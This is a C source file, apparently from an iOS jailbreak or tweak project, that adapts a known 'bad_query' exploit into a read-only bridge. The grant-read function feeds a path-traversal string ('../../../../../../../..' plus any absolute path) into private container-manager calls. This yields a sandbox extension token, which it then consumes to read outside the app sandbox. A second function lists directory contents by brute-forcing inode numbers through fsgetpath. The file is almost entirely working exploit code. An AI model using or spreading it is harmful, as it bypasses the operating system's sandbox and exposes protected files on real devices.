// VexNative v0.14.5 Erosion-compatible read-only bad_query bridge.
//
// Derived from jailbreakdotparty/Erosion bad_query.c / forcequitOS bad_query.
// This Vex adaptation deliberately omits write probes and mutation helpers.
// It exposes sandbox-extension acquisition plus inode-based child enumeration.

#include <dlfcn.h>
#include <errno.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fsgetpath.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <unistd.h>
#include <xpc/xpc.h>

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

int64_t vex_bad_query_grant_read(const char *path) {
    if (!path || path[0] != '/') return -255;

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    container_query_create_fn query_create =
        (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class =
        (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers =
        (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags =
        (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part =
        (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain =
        (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result =
        (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free =
        (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token =
        (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension =
        (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_identifiers ||
        !query_set_flags || !query_set_part || !query_set_part_domain ||
        !query_get_single_result || !query_free || !copy_sandbox_token ||
        !consume_extension) {
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -2;
    }

    query_set_class(query, 13);
    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    if (!identifier) {
        query_free(query);
        dlclose(mgr);
        return -6;
    }

    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);

    char *part = NULL;
    if (asprintf(&part, "../../../../../../../..%s", path) == -1 || !part) {
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -5;
    }

    query_set_part_domain(query, part);
    query_set_flags(query, 0x0000008000000000ULL);

    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -3;
    }

    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -4;
    }

    int64_t handle = consume_extension(token);

    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);
    dlclose(mgr);
    return handle;
}

void vex_bad_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension =
        (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

char *vex_bad_query_list(const char *path, int64_t max_inode) {
    if (!path || path[0] != '/' || max_inode <= 0) return NULL;

    struct statfs sfs;
    if (statfs(path, &sfs) != 0) {
        if (statfs("/private/var", &sfs) != 0 && statfs("/var", &sfs) != 0) {
            return NULL;
        }
    }

    fsid_t fsid = sfs.f_fsid;
    size_t cap = 65536;
    size_t length = 0;
    size_t path_length = strlen(path);
    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';

    char buf[1200];
    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;

        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;

        size_t need = strlen(p) + 2;
        if (length + need > cap) {
            size_t next = cap * 2;
            char *tmp = realloc(out, next);
            if (!tmp) break;
            out = tmp;
            cap = next;
        }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}
